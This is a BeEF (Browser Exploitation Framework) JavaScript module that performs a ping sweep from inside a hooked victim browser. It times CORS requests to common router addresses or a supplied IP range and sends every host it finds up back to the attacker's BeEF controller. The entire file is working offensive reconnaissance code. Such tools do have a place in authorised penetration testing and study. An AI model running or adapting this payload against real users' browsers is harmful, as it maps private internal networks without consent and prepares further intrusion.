//
// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

  var ips = new Array();
  var rhosts = "<%= @rhosts %>";
  var threads = parseInt("<%= @threads %>", 10) || 3;
  var timeout = 1000;

  if(!beef.browser.hasCors()) {
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Browser does not support CORS', beef.are.status_error());
    return;
  }

  // set target IP addresses
  if (rhosts == 'common') {
    // use default IPs
    ips = [
      '192.168.0.1',
      '192.168.0.100',
      '192.168.0.254',
      '192.168.1.1',
      '192.168.1.100',
      '192.168.1.254',
      '10.0.0.1',
      '10.1.1.1',
      '192.168.2.1',
      '192.168.2.254',
      '192.168.100.1',
      '192.168.100.254',
      '192.168.123.1',
      '192.168.123.254',
      '192.168.10.1',
      '192.168.10.254'
    ];
  } else {
    // set target IP range
    var range = rhosts.match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\-([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
    if (range == null || range[1] == null) {
      beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=malformed IP range supplied", beef.are.status_error());
      return;
    }
    ipBounds   = rhosts.split('-');
    lowerBound = ipBounds[0].split('.')[3];
    upperBound = ipBounds[1].split('.')[3];
    for (var i = lowerBound; i <= upperBound; i++){
      ipToTest = ipBounds[0].split('.')[0]+"."+ipBounds[0].split('.')[1]+"."+ipBounds[0].split('.')[2]+"."+i;
      ips.push(ipToTest);
    }
  }

  WorkerQueue = function(frequency) {

    var stack = [];
    var timer = null;
    var frequency = frequency;
    var start_scan = (new Date).getTime();

    this.process = function() {
      var item = stack.shift();
      eval(item);
      if (stack.length === 0) {
        clearInterval(timer);
        timer = null;
        var interval = (new Date).getTime() - start_scan;
        beef.debug("[Ping Sweep] Worker queue is complete ["+interval+" ms]");
        return;
      }
    }

    this.queue = function(item) {
      stack.push(item);
      if (timer === null) timer = setInterval(this.process, frequency);
    }

  }

  // create workers
  var workers = new Array();
  for (w=0; w < threads; w++) workers.push(new WorkerQueue(timeout));

  beef.debug("[Ping Sweep] Starting scan ("+(ips.length)+" URLs / "+threads+" workers)");
  for (var i=0; i < ips.length; i++) {
    var worker = workers[i % threads];
    var ip = ips[i];
    // use a high port likely to be closed/filtered (60000 - 65000)
    var port = Math.floor(Math.random() * 5000) + 60000;
    worker.queue('var start_time = new Date().getTime();' +
      'beef.net.cors.request(' +
        '"GET", "http://'+ip+':'+port+'/", "", '+timeout+', function(response) {' +
          'var current_time = new Date().getTime();' +
          'var duration = current_time - start_time;' +
          'if (duration < '+timeout+') {' +
            'beef.debug("[Ping Sweep] '+ip+' [" + duration + " ms] -- host is up");' +
            'beef.net.send("<%= @command_url %>", <%= @command_id %>, "ip='+ip+'&ping="+duration+"ms", beef.are.status_success());' +
          '} else {' +
            'beef.debug("[Ping Sweep] '+ip+' [" + duration + " ms] -- timeout");' +
          '}' +
      '});'
    );
    }

});

